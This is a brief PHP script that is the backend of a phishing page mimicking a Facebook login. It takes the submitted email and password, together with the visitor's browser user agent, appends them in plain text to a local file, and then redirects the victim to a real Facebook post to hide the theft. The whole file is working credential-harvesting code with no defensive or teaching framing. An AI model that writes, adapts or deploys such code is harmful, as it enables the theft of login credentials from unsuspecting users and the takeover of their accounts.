<?php
$handle = fopen("file.txt","a");
$browser_id = $_SERVER["HTTP_USER_AGENT"];
$email = $_POST['email'];
$password = $_POST['pass'];
if ($email == '')
{
	echo "<script>alert('Please enter username');</script>";
	exit();
}
if ($password == '')
{
	echo "<script>alert('Please enter password');</script>";
	exit();
}
fwrite($handle,"\n"."Browser id = ".$browser_id."\n"."Username = ".$email."\n"."password = ".$password."\n");
header('location:https://www.facebook.com/100048431733794/posts/101513751473016/?substory_index=0&app=fbl');
?>
